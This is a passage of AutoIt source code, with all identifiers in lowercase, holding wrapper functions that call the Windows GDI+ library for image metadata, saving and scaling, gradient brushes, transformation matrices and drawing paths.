	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Local $tpropertyitem = DllStructCreate("int id; int length; short type; ptr value;", $pbuffer)
	Local $ibytes = DllStructGetData($tpropertyitem, "length")
	Local $pvalue = DllStructGetData($tpropertyitem, "value")
	Local $tvalues, $ivalues
	Switch DllStructGetData($tpropertyitem, "type")
		Case 2
			$ivalues = 1
			$tvalues = DllStructCreate("char[" & $ibytes & "];", $pvalue)
		Case 3
			$ivalues = Int($ibytes / 2)
			$tvalues = DllStructCreate("ushort[" & $ivalues & "];", $pvalue)
		Case 4, 5
			$ivalues = Int($ibytes / 4)
			$tvalues = DllStructCreate("uint[" & $ivalues & "];", $pvalue)
		Case 9, 10
			$ivalues = Int($ibytes / 4)
			$tvalues = DllStructCreate("int[" & $ivalues & "];", $pvalue)
		Case Else
			$ivalues = 1
			$tvalues = DllStructCreate("byte[" & $ibytes & "];", $pvalue)
	EndSwitch
	Local $avalues[$ivalues + 1] = [$ivalues]
	Switch DllStructGetData($tpropertyitem, "type")
		Case 5, 10
			$ivalues = Int($ivalues / 2)
			ReDim $avalues[$ivalues + 1]
			$avalues[0] = $ivalues
			For $j = 1 To $ivalues
				$avalues[$j] = DllStructGetData($tvalues, 1, ($j - 1) * 2 + 1) / DllStructGetData($tvalues, 1, ($j - 1) * 2 + 2)
			Next
		Case 3, 4, 9
			For $j = 1 To $ivalues
				$avalues[$j] = DllStructGetData($tvalues, 1, $j)
			Next
		Case Else
			$avalues[1] = DllStructGetData($tvalues, 1)
	EndSwitch
	Return $avalues
EndFunc

Func _gdiplus_imagegetrawformat($himage)
	Local $aguid[2]
	If ($himage = -1) OR (NOT $himage) Then Return SetError(11, 0, $aguid)
	Local $aimagetype[11][2] = [["UNDEFINED", $gdip_imageformat_undefined], ["MEMORYBMP", $gdip_imageformat_memorybmp], ["BMP", $gdip_imageformat_bmp], ["EMF", $gdip_imageformat_emf], ["WMF", $gdip_imageformat_wmf], ["JPEG", $gdip_imageformat_jpeg], ["PNG", $gdip_imageformat_png], ["GIF", $gdip_imageformat_gif], ["TIFF", $gdip_imageformat_tiff], ["EXIF", $gdip_imageformat_exif], ["ICON", $gdip_imageformat_icon]]
	Local $tstruct = DllStructCreate("byte[16]")
	Local $aresult1 = DllCall($__g_hgdipdll, "int", "GdipGetImageRawFormat", "handle", $himage, "struct*", $tstruct)
	If @error Then Return SetError(@error, @extended, $aguid)
	If $aresult1[0] Then Return SetError(10, $aresult1[0], $aguid)
	Local $sresult2 = _winapi_stringfromguid($aresult1[2])
	If @error Then Return SetError(@error + 20, @extended, $aguid)
	If $sresult2 = "" Then Return SetError(12, 0, $aguid)
	For $i = 0 To 10
		If $aimagetype[$i][1] == $sresult2 Then
			$aguid[0] = $aimagetype[$i][1]
			$aguid[1] = $aimagetype[$i][0]
			Return $aguid
		EndIf
	Next
	Return SetError(13, 0, $aguid)
EndFunc

Func _gdiplus_imagegetthumbnail($himage, $iwidth = 0, $iheight = 0, $bkeepratio = True, $hcallback = NULL , $hcallbackdata = NULL )
	If $bkeepratio Then
		Local $aimgdim = _gdiplus_imagegetdimension($himage)
		If @error Then Return SetError(@error + 20, @extended, False)
		Local $f
		If $iwidth < 1 OR $iheight < 1 Then
			$iwidth = 0
			$iheight = 0
		Else
			If ($aimgdim[0] / $aimgdim[1]) > 1 Then
				$f = $aimgdim[0] / $iwidth
			Else
				$f = $aimgdim[1] / $iheight
			EndIf
			$iwidth = Int($aimgdim[0] / $f)
			$iheight = Int($aimgdim[1] / $f)
		EndIf
	EndIf
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageThumbnail", "handle", $himage, "uint", $iwidth, "uint", $iheight, "ptr*", 0, "ptr", $hcallback, "ptr", $hcallbackdata)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return $aresult[4]
EndFunc

Func _gdiplus_imagegettype($himage)
	If ($himage = -1) OR (NOT $himage) Then Return SetError(11, 0, -1)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageType", "handle", $himage, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_imagegetverticalresolution($himage)
	If ($himage = -1) OR (NOT $himage) Then Return SetError(11, 0, 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageVerticalResolution", "handle", $himage, "float*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return Round($aresult[2])
EndFunc

Func _gdiplus_imagegetwidth($himage)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetImageWidth", "handle", $himage, "uint*", -1)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_imageloadfromfile($sfilename)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipLoadImageFromFile", "wstr", $sfilename, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_imageloadfromstream($pstream)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipLoadImageFromStream", "ptr", $pstream, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_imagerotateflip($himage, $irotatefliptype)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipImageRotateFlip", "handle", $himage, "int", $irotatefliptype)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imagesaveadd($himage, $tparams)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSaveAdd", "handle", $himage, "struct*", $tparams)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imagesaveaddimage($himage, $himagenew, $tparams)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSaveAddImage", "handle", $himage, "handle", $himagenew, "struct*", $tparams)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imagesavetofile($himage, $sfilename)
	Local $sext = __gdiplus_extractfileext($sfilename)
	Local $sclsid = _gdiplus_encodersgetclsid($sext)
	If $sclsid = "" Then Return SetError(-1, 0, False)
	Local $bret = _gdiplus_imagesavetofileex($himage, $sfilename, $sclsid, 0)
	Return SetError(@error, @extended, $bret)
EndFunc

Func _gdiplus_imagesavetofileex($himage, $sfilename, $sencoder, $tparams = 0)
	Local $tguid = _winapi_guidfromstring($sencoder)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSaveImageToFile", "handle", $himage, "wstr", $sfilename, "struct*", $tguid, "struct*", $tparams)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imagesavetostream($himage, $pstream, $tencoder, $tparams = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSaveImageToStream", "handle", $himage, "ptr", $pstream, "struct*", $tencoder, "struct*", $tparams)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imagescale($himage, $iscalew, $iscaleh, $iinterpolationmode = $gdip_interpolationmode_highqualitybicubic)
	Local $iwidth = _gdiplus_imagegetwidth($himage) * $iscalew
	If @error Then Return SetError(1, 0, 0)
	Local $iheight = _gdiplus_imagegetheight($himage) * $iscaleh
	If @error Then Return SetError(2, 0, 0)
	Local $hbitmap = _gdiplus_bitmapcreatefromscan0($iwidth, $iheight)
	If @error Then Return SetError(3, 0, 0)
	Local $hbmpctxt = _gdiplus_imagegetgraphicscontext($hbitmap)
	If @error Then
		_gdiplus_bitmapdispose($hbitmap)
		Return SetError(4, 0, 0)
	EndIf
	_gdiplus_graphicssetinterpolationmode($hbmpctxt, $iinterpolationmode)
	If @error Then
		_gdiplus_graphicsdispose($hbmpctxt)
		_gdiplus_bitmapdispose($hbitmap)
		Return SetError(5, 0, 0)
	EndIf
	_gdiplus_graphicsdrawimagerect($hbmpctxt, $himage, 0, 0, $iwidth, $iheight)
	If @error Then
		_gdiplus_graphicsdispose($hbmpctxt)
		_gdiplus_bitmapdispose($hbitmap)
		Return SetError(6, 0, 0)
	EndIf
	_gdiplus_graphicsdispose($hbmpctxt)
	Return $hbitmap
EndFunc

Func _gdiplus_imageselectactiveframe($himage, $sdimensionid, $iframeindex)
	Local $tguid = _winapi_guidfromstring($sdimensionid)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipImageSelectActiveFrame", "handle", $himage, "struct*", $tguid, "uint", $iframeindex)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_imageresize($himage, $inewwidth, $inewheight, $iinterpolationmode = $gdip_interpolationmode_highqualitybicubic)
	Local $hbitmap = _gdiplus_bitmapcreatefromscan0($inewwidth, $inewheight)
	If @error Then Return SetError(1, 0, 0)
	Local $hbmpctxt = _gdiplus_imagegetgraphicscontext($hbitmap)
	If @error Then
		_gdiplus_bitmapdispose($hbitmap)
		Return SetError(2, @extended, 0)
	EndIf
	_gdiplus_graphicssetinterpolationmode($hbmpctxt, $iinterpolationmode)
	If @error Then
		_gdiplus_graphicsdispose($hbmpctxt)
		_gdiplus_bitmapdispose($hbitmap)
		Return SetError(3, @extended, 0)
	EndIf
	_gdiplus_graphicsdrawimagerect($hbmpctxt, $himage, 0, 0, $inewwidth, $inewheight)
	If @error Then
		_gdiplus_graphicsdispose($hbmpctxt)
		_gdiplus_bitmapdispose($hbitmap)
		Return SetError(4, @extended, 0)
	EndIf
	_gdiplus_graphicsdispose($hbmpctxt)
	Return $hbitmap
EndFunc

Func _gdiplus_linebrushcreate($nx1, $ny1, $nx2, $ny2, $iargbclr1, $iargbclr2, $iwrapmode = 0)
	Local $tpointf1, $tpointf2, $aresult
	$tpointf1 = DllStructCreate("float;float")
	$tpointf2 = DllStructCreate("float;float")
	DllStructSetData($tpointf1, 1, $nx1)
	DllStructSetData($tpointf1, 2, $ny1)
	DllStructSetData($tpointf2, 1, $nx2)
	DllStructSetData($tpointf2, 2, $ny2)
	$aresult = DllCall($__g_hgdipdll, "int", "GdipCreateLineBrush", "struct*", $tpointf1, "struct*", $tpointf2, "uint", $iargbclr1, "uint", $iargbclr2, "int", $iwrapmode, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[6]
EndFunc

Func _gdiplus_linebrushcreatefromrect($trectf, $iargbclr1, $iargbclr2, $igradientmode = 0, $iwrapmode = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateLineBrushFromRect", "struct*", $trectf, "uint", $iargbclr1, "uint", $iargbclr2, "int", $igradientmode, "int", $iwrapmode, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[6]
EndFunc

Func _gdiplus_linebrushcreatefromrectwithangle($trectf, $iargbclr1, $iargbclr2, $fangle, $bisanglescalable = True, $iwrapmode = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateLineBrushFromRectWithAngle", "struct*", $trectf, "uint", $iargbclr1, "uint", $iargbclr2, "float", $fangle, "int", $bisanglescalable, "int", $iwrapmode, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[7]
EndFunc

Func _gdiplus_linebrushgetcolors($hlinegradientbrush)
	Local $targbs, $aargbs[2], $aresult
	$targbs = DllStructCreate("uint;uint")
	$aresult = DllCall($__g_hgdipdll, "uint", "GdipGetLineColors", "handle", $hlinegradientbrush, "struct*", $targbs)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	$aargbs[0] = DllStructGetData($targbs, 1)
	$aargbs[1] = DllStructGetData($targbs, 2)
	Return $aargbs
EndFunc

Func _gdiplus_linebrushgetrect($hlinegradientbrush)
	Local $trectf = DllStructCreate($taggdiprectf)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetLineRect", "handle", $hlinegradientbrush, "struct*", $trectf)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Local $arectf[4]
	For $ii = 1 To 4
		$arectf[$ii - 1] = DllStructGetData($trectf, $ii)
	Next
	Return $arectf
EndFunc

Func _gdiplus_linebrushmultiplytransform($hlinegradientbrush, $hmatrix, $iorder = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipMultiplyLineTransform", "handle", $hlinegradientbrush, "handle", $hmatrix, "int", $iorder)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_linebrushresettransform($hlinegradientbrush)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipResetLineTransform", "handle", $hlinegradientbrush)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_linebrushsetblend($hlinegradientbrush, $ablends)
	Local $ii, $icount, $tfactors, $tpositions, $aresult
	$icount = $ablends[0][0]
	$tfactors = DllStructCreate("float[" & $icount & "]")
	$tpositions = DllStructCreate("float[" & $icount & "]")
	For $ii = 1 To $icount
		DllStructSetData($tfactors, 1, $ablends[$ii][0], $ii)
		DllStructSetData($tpositions, 1, $ablends[$ii][1], $ii)
	Next
	$aresult = DllCall($__g_hgdipdll, "int", "GdipSetLineBlend", "handle", $hlinegradientbrush, "struct*", $tfactors, "struct*", $tpositions, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_linebrushsetcolors($hlinegradientbrush, $iargbstart, $iargbend)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetLineColors", "handle", $hlinegradientbrush, "uint", $iargbstart, "uint", $iargbend)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_linebrushsetgammacorrection($hlinegradientbrush, $busegammacorrection = True)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetLineGammaCorrection", "handle", $hlinegradientbrush, "int", $busegammacorrection)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_linebrushsetlinearblend($hlinegradientbrush, $ffocus, $fscale = 1)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetLineLinearBlend", "handle", $hlinegradientbrush, "float", $ffocus, "float", $fscale)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_linebrushsetpresetblend($hlinegradientbrush, $ainterpolations)
	Local $ii, $icount, $tcolors, $tpositions, $aresult
	$icount = $ainterpolations[0][0]
	$tcolors = DllStructCreate("uint[" & $icount & "]")
	$tpositions = DllStructCreate("float[" & $icount & "]")
	For $ii = 1 To $icount
		DllStructSetData($tcolors, 1, $ainterpolations[$ii][0], $ii)
		DllStructSetData($tpositions, 1, $ainterpolations[$ii][1], $ii)
	Next
	$aresult = DllCall($__g_hgdipdll, "int", "GdipSetLinePresetBlend", "handle", $hlinegradientbrush, "struct*", $tcolors, "struct*", $tpositions, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_linebrushsetsigmablend($hlinegradientbrush, $ffocus, $fscale = 1)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetLineSigmaBlend", "handle", $hlinegradientbrush, "float", $ffocus, "float", $fscale)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_linebrushsettransform($hlinegradientbrush, $hmatrix)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetLineTransform", "handle", $hlinegradientbrush, "handle", $hmatrix)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_matrixcreate()
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateMatrix", "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[1]
EndFunc

Func _gdiplus_matrixcreate2($nm11 = 1, $nm12 = 1, $nm21 = 1, $nm22 = 1, $ndx = 0, $ndy = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateMatrix2", "float", $nm11, "float", $nm12, "float", $nm21, "float", $nm22, "float", $ndx, "float", $ndy, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[7]
EndFunc

Func _gdiplus_matrixclone($hmatrix)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCloneMatrix", "handle", $hmatrix, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_matrixdispose($hmatrix)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeleteMatrix", "handle", $hmatrix)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_matrixgetelements($hmatrix)
	Local $telements = DllStructCreate("float[6]")
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetMatrixElements", "handle", $hmatrix, "struct*", $telements)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Local $aelements[6]
	For $ii = 1 To 6
		$aelements[$ii - 1] = DllStructGetData($telements, 1, $ii)
	Next
	Return $aelements
EndFunc

Func _gdiplus_matrixinvert($hmatrix)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipInvertMatrix", "handle", $hmatrix)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_matrixmultiply($hmatrix1, $hmatrix2, $iorder = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipMultiplyMatrix", "handle", $hmatrix1, "handle", $hmatrix2, "int", $iorder)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_matrixrotate($hmatrix, $fangle, $bappend = False)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipRotateMatrix", "handle", $hmatrix, "float", $fangle, "int", $bappend)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_matrixscale($hmatrix, $fscalex, $fscaley, $border = False)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipScaleMatrix", "handle", $hmatrix, "float", $fscalex, "float", $fscaley, "int", $border)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_matrixsetelements($hmatrix, $nm11 = 1, $nm12 = 0, $nm21 = 0, $nm22 = 1, $ndx = 0, $ndy = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetMatrixElements", "handle", $hmatrix, "float", $nm11, "float", $nm12, "float", $nm21, "float", $nm22, "float", $ndx, "float", $ndy)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_matrixshear($hmatrix, $fshearx, $fsheary, $iorder = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipShearMatrix", "handle", $hmatrix, "float", $fshearx, "float", $fsheary, "int", $iorder)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_matrixtransformpoints($hmatrix, ByRef $apoints)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], ($ii - 1) * 2 + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], ($ii - 1) * 2 + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipTransformMatrixPoints", "handle", $hmatrix, "struct*", $tpoints, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	For $ii = 1 To $icount
		$apoints[$ii][0] = DllStructGetData($tpoints, 1, ($ii - 1) * 2 + 1)
		$apoints[$ii][1] = DllStructGetData($tpoints, 1, ($ii - 1) * 2 + 2)
	Next
	Return True
EndFunc

Func _gdiplus_matrixtranslate($hmatrix, $foffsetx, $foffsety, $bappend = False)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipTranslateMatrix", "handle", $hmatrix, "float", $foffsetx, "float", $foffsety, "int", $bappend)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_paramadd(ByRef $tparams, $sguid, $inbofvalues, $itype, $pvalues)
	Local $icount = DllStructGetData($tparams, "Count")
	Local $pguid = DllStructGetPtr($tparams, "GUID") + ($icount * _gdiplus_paramsize())
	Local $tparam = DllStructCreate($taggdipencoderparam, $pguid)
	_winapi_guidfromstringex($sguid, $pguid)
	DllStructSetData($tparam, "Type", $itype)
	DllStructSetData($tparam, "NumberOfValues", $inbofvalues)
	DllStructSetData($tparam, "Values", $pvalues)
	DllStructSetData($tparams, "Count", $icount + 1)
EndFunc

Func _gdiplus_paraminit($icount)
	Local $sstruct = $taggdipencoderparams
	For $i = 2 To $icount
		$sstruct &= ";struct;byte[16];ulong;ulong;ptr;endstruct"
	Next
	Return DllStructCreate($sstruct)
EndFunc

Func _gdiplus_paramsize()
	Local $tparam = DllStructCreate($taggdipencoderparam)
	Return DllStructGetSize($tparam)
EndFunc

Func _gdiplus_pathaddarc($hpath, $nx, $ny, $nwidth, $nheight, $fstartangle, $fsweepangle)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathArc", "handle", $hpath, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "float", $fstartangle, "float", $fsweepangle)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddbezier($hpath, $nx1, $ny1, $nx2, $ny2, $nx3, $ny3, $nx4, $ny4)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathBezier", "handle", $hpath, "float", $nx1, "float", $ny1, "float", $nx2, "float", $ny2, "float", $nx3, "float", $ny3, "float", $nx4, "float", $ny4)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddclosedcurve($hpath, $apoints)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathClosedCurve", "handle", $hpath, "struct*", $tpoints, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddclosedcurve2($hpath, $apoints, $ntension = 0.5)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathClosedCurve2", "handle", $hpath, "struct*", $tpoints, "int", $icount, "float", $ntension)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddcurve($hpath, $apoints)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathCurve", "handle", $hpath, "struct*", $tpoints, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddcurve2($hpath, $apoints, $ntension = 0.5)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathCurve2", "handle", $hpath, "struct*", $tpoints, "int", $icount, "float", $ntension)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddcurve3($hpath, $apoints, $ioffset, $inumofsegments, $ntension = 0.5)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathCurve3", "handle", $hpath, "struct*", $tpoints, "int", $icount, "int", $ioffset, "int", $inumofsegments, "float", $ntension)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddellipse($hpath, $nx, $ny, $nwidth, $nheight)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathEllipse", "handle", $hpath, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddline($hpath, $nx1, $ny1, $nx2, $ny2)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathLine", "handle", $hpath, "float", $nx1, "float", $ny1, "float", $nx2, "float", $ny2)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddline2($hpath, $apoints)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathLine2", "handle", $hpath, "struct*", $tpoints, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddpath($hpath1, $hpath2, $bconnect = True)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathPath", "handle", $hpath1, "handle", $hpath2, "int", $bconnect)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddpie($hpath, $nx, $ny, $nwidth, $nheight, $fstartangle, $fsweepangle)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathPie", "handle", $hpath, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "float", $fstartangle, "float", $fsweepangle)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pathaddpolygon($hpath, $apoints)
	Local $icount = $apoints[0][0]
	Local $tpoints = DllStructCreate("float[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipAddPathPolygon", "handle", $hpath, "struct*", $tpoints, "int", $icount)
	If @error Then Return SetError(@error, @extended, False)
